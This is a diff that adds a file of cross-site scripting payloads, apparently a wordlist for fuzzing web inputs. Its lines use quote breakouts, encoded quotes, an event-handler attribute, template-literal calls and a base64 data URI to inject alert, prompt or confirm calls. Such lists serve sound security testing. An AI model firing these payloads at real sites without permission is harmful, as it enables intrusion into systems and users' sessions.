@@ -1,0 +1,23 @@
+')alert('XSS
+'); alert('XSS
+\";alert('XSS');//
+-alert(1)-//
+-prompt(1)-/*
+1';alert(/XSS/);x='1
+';alert(/XSS/);'
+"-alert(1)-"
+"/alert(1)/"
+"|alert(1)|"
+>>alert(1)>>
+\";alert('X');//
+&#x00027;; confirm(1); &#x00027;
+&#39;; confirm(1); &#39;
+%27; confirm(1); %27
+&apos;; confirm(1); &apos;
+\u0027 confirm(1); \u0027
+"; javascript:window.open('data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='); "
+"onmouseover="alert(1)
+a= {get[alert`1`](){}}
+alert`1`
+-alert`1`-
++onerror=alert(1)%3E/
